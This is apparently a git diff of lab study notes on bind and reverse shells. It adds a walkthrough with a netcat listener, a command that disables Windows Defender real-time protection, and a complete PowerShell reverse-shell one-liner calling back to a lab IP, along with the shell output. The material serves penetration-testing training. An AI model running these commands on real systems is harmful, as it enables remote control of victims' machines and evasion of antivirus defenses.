@@ -3,24 +3,13 @@
 ## Contents
 - [Shell Basics](#shell-basics)
     - [Bind Shells](#bind-shells)
-        - [What is it?](#what-is-it)
+    	- [What is it?](#what-is-it)
         - [Creating a TCP session with Netcat](#creating-a-tcp-session-with-netcat)
         - [Establishing a Basic Bind Shell with Netcat](#establishing-a-basic-bind-shell-with-netcat)
         - [Q](#q-ssh-to-the-target-create-a-bind-shell-then-use-netcat-to-connect-to-the-target-using-the-bind-shell-you-set-up-when-you-have-completed-the-exercise-submit-the-contents-of-the-flagtxt-file-located-at-customscripts)
     - [Reverse Shells](#reverse-shells)
-    - [What is it?](#what-is-it)
-     
-- [API Documentation](#api-documentation)
-- [Setup and Run](#setup-and-run)
-- [Commands](#commands)
-    - [Wallet](#wallet)
-    - [Price](#price)
-    - [Other](#other)
-- [TODO](#todo)
-- [Contribute](#contribute)
-  - [Pull request](#pull-request)
-- [Contributors](#contributors)
-- [License](#license)
+        - [What is it?](#what-is-it)
+        - [Hands-on With A Simple Reverse Shell in Windows](#hands-on-with-a-simple-reverse-shell-in-windows)
 
 # Shell Basics
 
@@ -126,13 +115,71 @@ And now you should have a binding shell.
 
 To find the flag for the task. Go to the root directory and move into the folder /customscripts with cd and cat the flag file.
 
-## Reverse Shell
+## Reverse Shells
 
 ### What is it?
 
 Reverse shells are the victim connecting to our machine.
 
 With a reverse shell, the attack box will have a listener running, and the target will need to initiate the connection.
+
+To demonstrate this, we can attack a windows machine
+
+### Hands-on With A Simple Reverse Shell in Windows
+
+We will run some powershell code on a Windows target. 
+
+First we need to set up our listening port. 
+
+To get this to work you need to know your own IP adress. This can be shown with running a command in the terminal 
+
+Linux:
+```console
+ifconfig
+```
+
+Windows:
+```console
+ipconfig
+```
+
+Setting up netcat
+
+```console
+client@attacker:~$ sudo nc -lvnp 443
+Listening on 0.0.0.0 443
+```
+
+We are using the port 443 because we want to ensure it does not get blocked going outbound through the OS firewall and at the network level. Security teams rarely block out the port 443 beacuse it is so common to use for HTTPS
+
+---
+
+Open up the Windows machine
+
+To disable antivirus
+```powershell
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+Powershell code payload
+```powershell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+This is the output you should get in your attack box 
+```console
+client@attacker:~$ sudo nc -lvnp 443
+
+Listening on 0.0.0.0 443
+Connection received on 10.129.36.68 49674
+
+PS C:\Users\htb-student> whoami
+ws01\htb-student
+```
+
+Here we have received the connection and I am running whoami to check the hostname and username.  
+
+
 
 ![image](https://user-images.githubusercontent.com/83395536/223561378-f945d08b-8e4a-4bf8-bb92-39f652519890.png)
 
